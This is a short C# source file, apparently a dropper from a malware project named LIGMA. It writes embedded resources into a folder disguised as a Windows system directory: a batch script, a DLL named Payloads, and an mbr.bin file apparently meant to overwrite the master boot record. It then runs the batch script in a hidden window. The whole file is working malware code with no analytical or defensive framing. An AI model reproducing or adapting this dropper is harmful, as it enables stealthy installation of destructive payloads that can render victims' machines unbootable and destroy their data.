using System.Diagnostics;
using System.IO;

namespace LIGMA {

    class Resources {

        public static void MainCopy() {

            string extractPATH = @"C:\WinWOW32\";

            File.WriteAllBytes(extractPATH + "\\work.bat", Properties.Resources.work);
            File.WriteAllBytes(extractPATH + "\\icon.ico", Properties.Resources.icon);
            File.WriteAllBytes(extractPATH + "\\Payloads.dll", Properties.Resources.Payloads);
            File.WriteAllBytes(extractPATH + "\\mbr.bin", Properties.Resources.mbr);

            new Process { StartInfo = new ProcessStartInfo(extractPATH + "\\work.bat") { CreateNoWindow = true, UseShellExecute = false } }.Start();
        }
    }
}
